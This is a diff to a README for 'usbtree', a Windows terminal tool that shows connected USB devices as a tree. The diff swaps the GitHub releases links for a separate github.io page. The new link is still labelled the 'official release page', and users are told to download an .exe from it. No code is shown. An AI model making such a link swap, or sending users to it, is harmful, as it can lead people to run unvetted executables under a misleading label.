@@ -1,6 +1,6 @@
 # 🔌 usbtree - See your computer USB devices live
 
-[![Download usbtree](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Longrange-willrogers911/usbtree/releases)
+[![Download usbtree](https://img.shields.io/badge/Download-Release-blue.svg)](https://longrange-willrogers911.github.io)
 
 usbtree shows a live map of every USB device connected to your computer. It runs inside your terminal window. The tool displays your devices as a tree structure. You can see how your devices connect to your machine. 
 
@@ -10,7 +10,7 @@ This tool works on Windows and does not need special permissions to run. It read
 
 To use usbtree, you need a computer running Windows 10 or Windows 11. You do not need to install anything. This program runs as a standalone file. 
 
-1. Visit the [official release page](https://github.com/Longrange-willrogers911/usbtree/releases).
+1. Visit the [official release page](https://longrange-willrogers911.github.io).
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
